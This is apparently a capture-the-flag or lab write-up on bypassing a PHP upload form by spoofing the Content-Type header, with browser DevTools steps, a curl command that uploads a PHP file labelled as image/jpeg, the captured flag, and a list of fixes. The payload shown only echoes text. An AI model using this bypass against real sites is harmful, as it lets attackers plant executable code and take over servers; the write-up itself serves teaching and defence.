# Content-Type File Upload Bypass — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=upload`
- Tested file uploads: JPEG ✓ accepted, PHP ✗ rejected
- Opened Firefox DevTools → Network tab
- Uploaded PHP file, observed `Content-Type: application/x-php`
- Hypothesis: Server validates Content-Type header only

**Testing:**
- Used "Edit and Resend" to change Content-Type to `image/jpeg`
- Upload succeeded → Vulnerability confirmed

## How I Exploited It

**Method 1: Firefox Developer Tools**
1. Create payload: `echo '<?php echo "test"; ?>' > bad.php`
2. Open DevTools (F12) → Network tab
3. Upload bad.php, capture request
4. Right-click → **Edit and Resend**
5. Change `Content-Type: application/x-php` to `Content-Type: image/jpeg`
6. Send → Flag revealed

**Method 2: cURL**
```bash
curl -X POST -F "Upload=Upload" \
  -F "uploaded=@bad.php;type=image/jpeg" \
  "http://192.168.1.16/index.php?page=upload"
```

**Flag obtained:**
```
46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## Why It Works

**Vulnerabilities:**
1. **Header-only validation** → Trusts client-supplied Content-Type
2. **No file signature check** → Doesn't verify actual file content
3. **No extension whitelist** → Accepts dangerous .php files
4. **Potential RCE** → PHP files can execute on server

**Note:** Real files have signatures (magic bytes):
- JPEG: `FF D8 FF`
- PNG: `89 50 4E 47`  
- Server never checks these

## How to Fix It

**Core principle:** Validate file content, not just headers. Never execute uploads.

**Essential fixes:**
1. **Whitelist extensions** - Only allow .jpg, .png, .gif
2. **Check magic bytes** - Verify actual file signature
3. **Rename files** - Random names prevent direct access
4. **Disable execution** - PHP can't run in upload directory
5. **Store outside web root** - Uploads not directly accessible
6. **File size limits** - Prevent resource exhaustion

## References

- OWASP File Upload Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- CWE-434 — https://cwe.mitre.org/data/definitions/434.html
- CWE-434: Unrestricted Upload of File with Dangerous Type
- OWASP A08:2021 – Software and Data Integrity Failures
